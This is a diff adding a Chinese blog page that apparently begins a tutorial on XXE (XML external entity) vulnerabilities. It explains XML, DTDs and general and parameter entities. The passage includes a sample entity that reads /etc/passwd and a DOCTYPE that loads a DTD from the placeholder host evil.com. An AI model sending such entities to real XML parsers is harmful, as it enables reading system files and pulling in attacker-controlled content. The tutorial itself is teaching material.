@@ -1,0 +1,1069 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.jpg">
+  <link rel="icon" href="/img/logo.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="ExploreIO">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="xxe漏洞手法总结基础知识学习一个漏洞肯定是要先掌握其基础知识 初始xmlxml是一种语言，有自己的语法规则，下面就要开始讲解其语言的规则和特点 xml 的主要作用是传输数据 我们熟知的html的作用是显示数据 下面这个就是xml语法的基本结构 1234567891011121314151617&lt;!--XML声明--&gt;&lt;?xml version&#x3D;&quot;1.0&quot;?&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ExploreIO&#39;s Blog">
+<meta property="og:url" content="https://exploreio.github.io/2026/07/25/xxe/index.html">
+<meta property="og:site_name" content="ExploreIO&#39;s Blog">
+<meta property="og:description" content="xxe漏洞手法总结基础知识学习一个漏洞肯定是要先掌握其基础知识 初始xmlxml是一种语言，有自己的语法规则，下面就要开始讲解其语言的规则和特点 xml 的主要作用是传输数据 我们熟知的html的作用是显示数据 下面这个就是xml语法的基本结构 1234567891011121314151617&lt;!--XML声明--&gt;&lt;?xml version&#x3D;&quot;1.0&quot;?&amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://exploreio.github.io/img/xxe/1769822381310-2c2abe61-47eb-462a-be6f-f7cc4c6035d2.png">
+<meta property="og:image" content="https://exploreio.github.io/img/xxe/image-20260727221003044.png">
+<meta property="og:image" content="https://exploreio.github.io/img/xxe/image-20260727221101106.png">
+<meta property="og:image" content="https://exploreio.github.io/img/xxe/image-20260727223806885.png">
+<meta property="og:image" content="https://exploreio.github.io/img/xxe/image-20260727224437308.png">
+<meta property="article:published_time" content="2026-07-25T01:37:19.044Z">
+<meta property="article:modified_time" content="2026-07-27T15:06:39.730Z">
+<meta property="article:author" content="ExploreIO">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://exploreio.github.io/img/xxe/1769822381310-2c2abe61-47eb-462a-be6f-f7cc4c6035d2.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>ExploreIO&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassBg.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"exploreio.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"▌","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":5,"color":"#36D399","options":{"showSpinner":false,"trickleSpeed":100,"easing":"ease-in-out"}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>ExploreIO&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-07-25 09:37" pubdate>
+          2026年7月25日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          11k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          20 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header"></h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="xxe漏洞手法总结"><a href="#xxe漏洞手法总结" class="headerlink" title="xxe漏洞手法总结"></a>xxe漏洞手法总结</h2><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>学习一个漏洞肯定是要先掌握其基础知识</p>
+<h3 id="初始xml"><a href="#初始xml" class="headerlink" title="初始xml"></a>初始xml</h3><p>xml是一种语言，有自己的语法规则，下面就要开始讲解其语言的规则和特点</p>
+<p>xml 的主要作用是传输数据</p>
+<p>我们熟知的html的作用是显示数据</p>
+<p>下面这个就是xml语法的基本结构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!--XML声明--&gt;<br>&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!--文档类型定义--&gt;<br>&lt;!DOCTYPE 根元素 [<br>&lt;!ELEMENT 根元素 (子元素1, 子元素2, 子元素3, 子元素4)&gt;<br>&lt;!ELEMENT 子元素1 (#PCDATA)&gt;<br>&lt;!ELEMENT 子元素2 (#PCDATA)&gt;<br>&lt;!ELEMENT 子元素3 (#PCDATA)&gt;<br>&lt;!ELEMENT 子元素4 (#PCDATA)&gt;<br>]&gt;<br>&lt;!--文档元素--&gt;<br>&lt;根元素&gt;<br>    &lt;子元素1&gt;内容1&lt;/子元素1&gt;<br>    &lt;子元素2&gt;内容2&lt;/子元素2&gt;<br>    &lt;子元素3&gt;内容3&lt;/子元素3&gt;<br>    &lt;子元素4&gt;内容4&lt;/子元素4&gt;<br>&lt;/根元素&gt;<br></code></pre></td></tr></table></figure>
+
+<p>大致可以了解为了这么几部分内容</p>
+<ul>
+<li>xml版本声明</li>
+<li>doctype</li>
+<li>element</li>
+<li>根元素，子元素</li>
+</ul>
+<h3 id="初始dtd"><a href="#初始dtd" class="headerlink" title="初始dtd"></a>初始dtd</h3><p>dtd是什么</p>
+<blockquote>
+<p>dtd是一个规则，一个要求</p>
+</blockquote>
+<p>感觉是不是理解起来很难受</p>
+<p>说简单一点在上面那个xml模板中dtd就是以下这部分的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!--XML声明--&gt;<br>&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!--文档类型定义--&gt;<br>&lt;!DOCTYPE 根元素 [<br>&lt;!ELEMENT 根元素 (子元素1, 子元素2, 子元素3, 子元素4)&gt;<br>&lt;!ELEMENT 子元素1 (#PCDATA)&gt;<br>&lt;!ELEMENT 子元素2 (#PCDATA)&gt;<br>&lt;!ELEMENT 子元素3 (#PCDATA)&gt;<br>&lt;!ELEMENT 子元素4 (#PCDATA)&gt;<br>]&gt;<br></code></pre></td></tr></table></figure>
+
+<p>可以知道dtd相当于声明了根元素和子元素</p>
+<p>所以说dtd与xml的关系就是被包含的关系，完整的xml语句中包含了完整的dtd</p>
+<blockquote>
+<p>内部声明实体的时候</p>
+</blockquote>
+<p>这里我使用了一个小字标注了<code>内部声明实体的时候</code>这里可能又会懵了，什么是内部声明，什么是实体</p>
+<p>在详细的讲之前可以先说明一下</p>
+<p>实际上我们主要要学习三种dtd格式<br>1.内部声明DTD：</p>
+<p><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code><br>2.引用外部DTD：</p>
+<p><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code><br>3.内外部DTD文档结合：</p>
+<p><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot; [定义内容]&gt;</code></p>
+<p>对于详细的各种类别的声明以及实体的解释，见后续内容</p>
+<h3 id="初始dtd声明"><a href="#初始dtd声明" class="headerlink" title="初始dtd声明"></a>初始dtd声明</h3><p>前面讲了声明有三种形式</p>
+<p>但是对于利用xxe漏洞来说只需要理解两种即可</p>
+<ul>
+<li>内部声明</li>
+<li>外部声明</li>
+</ul>
+<h4 id="内部dtd声明"><a href="#内部dtd声明" class="headerlink" title="内部dtd声明"></a>内部dtd声明</h4><p>内部声明的样子如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;<br></code></pre></td></tr></table></figure>
+
+<p>root就是根元素，xxe就是实体，可以看到该实体的值是file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</p>
+<p>所以说内部dtd声明就是自己定义dtd，然后使用</p>
+<h4 id="外部dtd声明"><a href="#外部dtd声明" class="headerlink" title="外部dtd声明"></a>外部dtd声明</h4><p>外部声明的样子如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!DOCTYPE root SYSTEM &quot;http://evil.com/1.dtd&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<p>这里就可以看到就没有实体了，这里引用的是evil.com里面的1.dtd在这个dtd里面有实体</p>
+<blockquote>
+<p>该例子是外部dtd引用，不是外部实体声明</p>
+</blockquote>
+<h3 id="初始实体"><a href="#初始实体" class="headerlink" title="初始实体"></a>初始实体</h3><p>前面讲了这么多的实体来实体去的，到底什么是实体</p>
+<p>实体是xml里面的一个变量，一个快捷方式</p>
+<p>变量很好理解，就是定义值。快捷方式就是可以重复使用这个变量</p>
+<p>首先看看怎么定义实体呢</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY 实体名 &quot;实体的值&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<p>通过这个可以知道entity就是定义实体的写法</p>
+<blockquote>
+<p>在 XML 的世界里，凡是带有 <code>&lt;!</code> 开头的内容，都是给解析器下达的指令</p>
+</blockquote>
+<p>好了讲了什么是实体之后，要开始讲实体有哪些类型和怎么使用实体了</p>
+<p>在xml 里面一共有四种实体</p>
+<p>内置实体，字符实体，通用实体，参数实体</p>
+<p>学习利用漏洞只需要学习两种实体</p>
+<ul>
+<li>通用实体</li>
+<li>参数实体</li>
+</ul>
+<h4 id="通用实体"><a href="#通用实体" class="headerlink" title="通用实体"></a>通用实体</h4><p>对于通用实体</p>
+<p>请看下面这个例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!-- 内部DTD：声明通用实体 --&gt;<br>&lt;!DOCTYPE 产品信息 [<br>    &lt;!-- 声明2个通用实体，存储重复使用的文本 --&gt;<br>    &lt;!ENTITY 品牌名称 &quot;XX科技有限公司&quot;&gt;<br>    &lt;!ENTITY 售后服务 &quot;全国联保，质保3年，7天无理由退换&quot;&gt;<br>    <br>    &lt;!-- 元素声明（仅为了XML结构合法，和实体无关） --&gt;<br>    &lt;!ELEMENT 产品信息 (产品+)&gt;<br>    &lt;!ELEMENT 产品 (名称, 品牌, 售后)&gt;<br>    &lt;!ELEMENT 名称 (#PCDATA)&gt;<br>    &lt;!ELEMENT 品牌 (#PCDATA)&gt;<br>    &lt;!ELEMENT 售后 (#PCDATA)&gt;<br>]&gt;<br><br>&lt;!-- XML文档内：引用通用实体 --&gt;<br>&lt;产品信息&gt;<br>    &lt;产品&gt;<br>        &lt;名称&gt;智能手机X1&lt;/名称&gt;<br>        &lt;品牌&gt;&amp;品牌名称;&lt;/品牌&gt;  &lt;!-- 引用通用实体 --&gt;<br>        &lt;售后&gt;&amp;售后服务;&lt;/售后&gt;  &lt;!-- 引用通用实体 --&gt;<br>    &lt;/产品&gt;<br>    &lt;产品&gt;<br>        &lt;名称&gt;平板电脑Y2&lt;/名称&gt;<br>        &lt;品牌&gt;&amp;品牌名称;&lt;/品牌&gt;  &lt;!-- 复用同一实体，无需重复编写 --&gt;<br>        &lt;售后&gt;&amp;售后服务;&lt;/售后&gt;  &lt;!-- 复用同一实体，方便统一修改 --&gt;<br>    &lt;/产品&gt;<br>&lt;/产品信息&gt;<br></code></pre></td></tr></table></figure>
+
+<p>通过注释我们可以知道在这个xml语句中定义了两个实体（变量）品牌名称和售后服务，后面使用这个实体（变量）是这样使用的&amp;品牌名称;和&amp;售后服务;</p>
+<p>所以</p>
+<p>解析出来的结果如下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">产品</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">名称</span>&gt;</span>智能手机X1<span class="hljs-tag">&lt;/<span class="hljs-name">名称</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">品牌</span>&gt;</span>XX科技有限公司<span class="hljs-tag">&lt;/<span class="hljs-name">品牌</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">售后</span>&gt;</span>全国联保，质保3年，7天无理由退换<span class="hljs-tag">&lt;/<span class="hljs-name">售后</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">产品</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">产品</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">名称</span>&gt;</span>平板电脑Y2<span class="hljs-tag">&lt;/<span class="hljs-name">名称</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">品牌</span>&gt;</span>XX科技有限公司<span class="hljs-tag">&lt;/<span class="hljs-name">品牌</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">售后</span>&gt;</span>全国联保，质保3年，7天无理由退换<span class="hljs-tag">&lt;/<span class="hljs-name">售后</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">产品</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>由上可以得到使用的方法</p>
+<ul>
+<li>声明：<code>&lt;!ENTITY 实体名 &quot;实体值&quot;&gt;</code>（不带<code>%</code>，在 DTD 内声明）</li>
+<li>引用：<code>&amp;实体名;</code>（必须以<code>&amp;</code>开头、<code>;</code>结尾）</li>
+<li>使用范围：<strong>DTD 内声明，XML 文档内引用</strong>（也可在 DTD 内引用，但极少用）</li>
+<li>核心用途：复用 XML 文档中的重复文本内容，减少冗余编写，方便统一修改</li>
+</ul>
+<h4 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h4><p>接下来就是参数实体了</p>
+<p>为什么会存在参数实体</p>
+<p>在面对大型的xml语句中通常会定义很多元素，然后元素里面会有很多子元素</p>
+<p>有了参数实体的存在可以便于重复的编写元素与元素之间包裹关系，便于dtd的编写</p>
+<p>可以看到下面这个例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE 公司人事档案 [<br>    &lt;!-- 第一步：定义一个“公共字段模板”（参数实体） --&gt;<br>    &lt;!-- 意思：只要是公司的人，都必须有姓名、工号、身份证号 --&gt;<br>    &lt;!ENTITY % 公共字段 &quot;(姓名, 工号, 身份证号)&quot;&gt;<br><br>    &lt;!-- 第二步：引用模板，定义不同类型员工的差异 --&gt;<br>    <br>    &lt;!-- 1. 正式员工 = 公共字段 + 额外的“转正日期” --&gt;<br>    &lt;!ELEMENT 正式员工 (%公共字段;, 转正日期)&gt;<br>    <br>    &lt;!-- 2. 实习生 = 公共字段 + 额外的“实习期限” --&gt;<br>    &lt;!ELEMENT 实习生 (%公共字段;, 实习期限)&gt;<br><br>    &lt;!-- 3. 外包员工 = 公共字段（没有额外字段，只用模板里的） --&gt;<br>    &lt;!ELEMENT 外包员工 %公共字段;&gt;<br><br>    &lt;!-- 第三步：具体定义这些字段是什么类型（都是纯文本） --&gt;<br>    &lt;!ELEMENT 姓名 (#PCDATA)&gt;<br>    &lt;!ELEMENT 工号 (#PCDATA)&gt;<br>    &lt;!ELEMENT 身份证号 (#PCDATA)&gt;<br>    &lt;!ELEMENT 转正日期 (#PCDATA)&gt;<br>    &lt;!ELEMENT 实习期限 (#PCDATA)&gt;<br>]&gt;<br><br>&lt;!-- 这是符合上面 DTD 规则的 XML 数据（一份公司的花名册） --&gt;<br>&lt;公司人事档案&gt;<br>    &lt;正式员工&gt;<br>        &lt;姓名&gt;李经理&lt;/姓名&gt;<br>        &lt;工号&gt;001&lt;/工号&gt;<br>        &lt;身份证号&gt;110101199001011234&lt;/身份证号&gt;<br>        &lt;转正日期&gt;2024-01-01&lt;/转正日期&gt;<br>    &lt;/正式员工&gt;<br>    <br>    &lt;实习生&gt;<br>        &lt;姓名&gt;小王&lt;/姓名&gt;<br>        &lt;工号&gt;101&lt;/工号&gt;<br>        &lt;身份证号&gt;440101200501015678&lt;/身份证号&gt;<br>        &lt;实习期限&gt;6个月&lt;/实习期限&gt;<br>    &lt;/实习生&gt;<br><br>    &lt;外包员工&gt;<br>        &lt;姓名&gt;老张&lt;/姓名&gt;<br>        &lt;工号&gt;201&lt;/工号&gt;<br>        &lt;身份证号&gt;320101198512013456&lt;/身份证号&gt;<br>    &lt;/外包员工&gt;<br>&lt;/公司人事档案&gt;<br></code></pre></td></tr></table></figure>
+
+<p>通过这个例子就很好理解了<code>公共字段</code>实体定义了三个子元素，<code>姓名，工号，身份证号</code>，这三个子元素被包裹在了正式员工，实习生，外包员工这三个元素里面</p>
+<p>参数实体的特点是由%来定义</p>
+<h3 id="实体声明"><a href="#实体声明" class="headerlink" title="实体声明"></a>实体声明</h3><p>在前面初始声明的时候就有接触过了实体的声明形式</p>
+<p>在这里就要具体讲讲使用方法了</p>
+<p>主要讲解的是有四种</p>
+<ul>
+<li>内部实体声明</li>
+<li>外部实体声明</li>
+<li>参数实体声明</li>
+<li>引用公共实体</li>
+</ul>
+<h4 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h4><p>这个是最好理解的</p>
+<p>这里可以编写一个简单的xml看看效果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY xxe &quot;Thinking&quot;&gt;]&gt;<br>&lt;foo&gt;&amp;xxe;&lt;/foo&gt;<br></code></pre></td></tr></table></figure>
+
+<p>有一些东西是需要注意的</p>
+<p>一个实体由三部分构成:&amp;符号, 实体名称, 分号 (;)，这里&amp;不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号</p>
+<p>所以说可以看到网站限制了只能内部实体声明的话，是没有xxe漏洞的</p>
+<h4 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h4><p>XML中对数据的引用称为实体，实体中有一类叫外部实体，用来引入外部资源，有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，外部实体的引用可以借助各种协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY 实体名称 SYSTEM “URI/URL”&gt;<br></code></pre></td></tr></table></figure>
+
+<p>外部实体支持很多的协议，如下</p>
+<p><img src="/../img/xxe/1769822381310-2c2abe61-47eb-462a-be6f-f7cc4c6035d2.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>使用的方法无非就是在定义实体的时候使用的是伪协议请求资源</p>
